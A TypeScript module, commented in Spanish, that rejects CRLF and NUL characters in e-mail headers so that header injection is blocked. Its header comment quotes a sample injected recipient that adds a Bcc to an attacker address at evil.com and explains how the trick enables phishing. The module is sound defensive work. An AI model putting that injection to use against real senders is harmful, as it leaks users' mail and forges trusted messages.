// ════════════════════════════════════════════════════════════════════════════
// Saneamiento de cabeceras de correo (auditoría 2026-07-28, Bloque B · PR-15).
//
// POR QUÉ
// Las cuatro funciones que arman un mensaje RFC-822 para la Gmail API
// (`send-email`, `notifications-dispatcher`, `notify-package`, `route-reminders`)
// interpolaban el destinatario CRUDO en la cabecera:
//
//     `To: ${to}`
//
// El `Subject` y el `from_name` sí van en base64 (`=?UTF-8?B?...?=`), que es
// inmune a esto. El `To` no. Y `to_email` solo se comprobaba por truthiness
// (`send-email:429`).
//
// En RFC-822 las cabeceras se separan por CRLF y el cuerpo empieza tras una
// línea en blanco. Así que un destinatario como
//
//     victima@x.com\r\nBcc: atacante@evil.com
//
// añade un Bcc que exfiltra cada correo, y con un doble CRLF se puede cerrar el
// bloque de cabeceras y escribir el cuerpo entero. En este producto el envío
// sale de la cuenta de Gmail VERIFICADA del tenant, así que el correo resultante
// pasa SPF/DKIM: es phishing con la identidad del cliente.
//
// QUÉ HACE ESTE MÓDULO
// Rechaza en vez de sanear. Recortar los CRLF en silencio dejaría pasar un
// destinatario distinto del que pidió quien llama; fallar es lo correcto porque
// ningún caso legítimo lleva saltos de línea en una dirección.
//
// Módulo PURO: sin I/O, sin supabase-js. Va en la lista de `deno check` de
// edge-tests.yml junto al resto de helpers puros.
// ════════════════════════════════════════════════════════════════════════════

/** CR, LF y NUL: los tres cortan o reescriben el bloque de cabeceras. */
const HEADER_BREAK = /[\r\n\u0000]/

/**
 * Dirección simple, sin display name ni comentarios: es lo único que estas
 * funciones necesitan (`to_email` y `reply_to` llegan como direcciones
 * desnudas). Deliberadamente NO acepta `"Nombre" <a@b.com>` ni listas separadas
 * por coma — admitir esas formas reabre la superficie que este módulo cierra.
 */
const SIMPLE_ADDRESS = /^[^\s@<>,;:"\\]+@[^\s@<>,;:"\\]+\.[^\s@<>,;:"\\]+$/

export class EmailHeaderError extends Error {
  constructor(message: string) {
    super(message)
    this.name = 'EmailHeaderError'
  }
}

/**
 * Valida un valor arbitrario de cabecera: sin CR/LF/NUL. Devuelve el valor tal
 * cual para poder usarlo en línea.
 */
export function assertHeaderValue(headerName: string, value: string): string {
  if (HEADER_BREAK.test(value)) {
    throw new EmailHeaderError(`Cabecera ${headerName} inválida: contiene salto de línea`)
  }
  return value
}

/**
 * Valida una dirección de correo destinada a una cabecera (`To`, `Reply-To`).
 * Recorta espacios laterales y exige la forma simple `local@dominio.tld`.
 */
export function assertEmailAddress(headerName: string, value: string): string {
  const trimmed = (value ?? '').trim()
  if (!trimmed) {
    throw new EmailHeaderError(`Cabecera ${headerName} inválida: vacía`)
  }
  // Se comprueba el salto de línea antes que el formato para que el mensaje de
  // error diga la verdad sobre lo que pasó (inyección, no "formato raro").
  assertHeaderValue(headerName, trimmed)
  if (!SIMPLE_ADDRESS.test(trimmed)) {
    throw new EmailHeaderError(`Cabecera ${headerName} inválida: no es una dirección simple`)
  }
  return trimmed
}

/** `true` si la dirección es utilizable en una cabecera. No lanza. */
export function isSafeEmailAddress(value: string): boolean {
  try {
    assertEmailAddress('To', value)
    return true
  } catch {
    return false
  }
}
